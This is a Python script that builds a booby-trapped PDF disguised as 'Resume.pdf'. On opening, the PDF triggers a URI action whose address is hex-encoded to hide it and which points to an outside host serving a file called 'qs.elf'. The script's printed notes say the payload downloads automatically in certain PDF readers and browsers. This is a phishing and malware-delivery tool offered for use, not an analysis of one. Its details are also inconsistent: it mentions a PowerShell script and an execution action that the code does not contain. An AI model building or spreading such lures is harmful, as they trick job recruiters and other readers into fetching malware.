import os

def create_raw_obfuscated_pdf(filename, target_url):

    hex_url = "".join([f"{ord(c):02x}" for c in target_url])
    hex_payload = f"<{hex_url}>"

    # Using WinExecution action which handles URLs differently
    pdf_content = (
        f"%PDF-1.7\n"
        f"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>\nendobj\n" 
        f"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        f"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [4 0 R] >>\nendobj\n"
        f"4 0 obj\n<< /Type /Annot /Subtype /Link /Rect [0 0 612 792] /Border [0 0 0] /A 5 0 R >>\nendobj\n" 
        f"5 0 obj\n<< /S /URI /URI {hex_payload} /Type /Action >>\nendobj\n" 
        f"xref\n0 6\n0000000000 65535 f\n0000000010 00000 n\n0000000079 00000 n\n"
        f"0000000139 00000 n\n0000000220 00000 n\n0000000318 00000 n\ntrailer\n"
        f"<< /Size 6 /Root 1 0 R >>\nstartxref\n400\n%%EOF"
    )

    try:
        with open(filename, "wb") as f:
            f.write(pdf_content.encode('latin-1'))
        print("-" * 50)
        print(f" Raw file created (No libraries used): {filename}")
        print(f" Obfuscated link inside the file: {hex_payload}")
        print("-" * 50)
        print(" NOTE: The PowerShell script will download when opened in:")
        print(" • Adobe Acrobat Reader (with protected mode off)")
        print(" • Older PDF readers (pre-2020)")
        print(" • Browsers with automatic download settings")
        print("-" * 50)
    except Exception as e:
        print(f" Write error: {e}")

if __name__ == "__main__":
    file_path = "Resume.pdf"
    target = "https://0.vern.cc/qs.elf"
    create_raw_obfuscated_pdf(file_path, target)